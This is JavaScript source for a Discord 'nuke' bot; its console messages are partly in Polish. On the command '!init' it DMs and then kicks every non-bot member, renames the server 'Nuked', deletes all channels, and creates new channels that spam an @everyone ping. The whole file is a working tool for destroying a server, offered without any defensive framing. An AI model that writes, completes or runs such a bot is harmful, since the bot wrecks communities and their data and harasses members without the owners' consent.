const { Client, Intents, MessageEmbed } = require('discord.js');

const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES, Intents.FLAGS.GUILD_MEMBERS] });
client.login('BOT_TOKEN');

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

client.on('ready', () => {
    client.guilds.cache.forEach(guild => {
        console.log(`[nukeBOT] - Gotowy na serwerze: ${guild.name}`);
    });
})

client.on('messageCreate', async (message) => {
    switch(message.content) {
        case "!init":
        {
            message.guild.members.fetch().then(members => {
                let i = 0;
                members.forEach(member => {
                    if(member.user.bot) {
                        i++;
                    } else {
                        setTimeout((member) => {
                            try {
                            console.log(member.user.username);

                            member.user.send(`Your message`).catch(err => {

                                console.log("Send to - " + member.user.username);

                            });

                            member.guild.setName(`Nuked`)

                            } catch(e) {
                                console.log("Kicked - " + e);
                            }

                            member.kick().catch(err => {
                                console.log("Kick error - " + member.user.username);
                            });

                        }, i * 1000, member);
                        i++;
                    }
                });
            });

            message.guild.channels.cache.forEach(channel => {
                channel.delete();
            });

            for(let i = 0; i < 2; i++) {
                message.guild.channels.create(`Channel Name`).then(channel => {
                    channel.send('Channel Message');
                    channel.send('@everyone')
                });
            }
        }
    }
});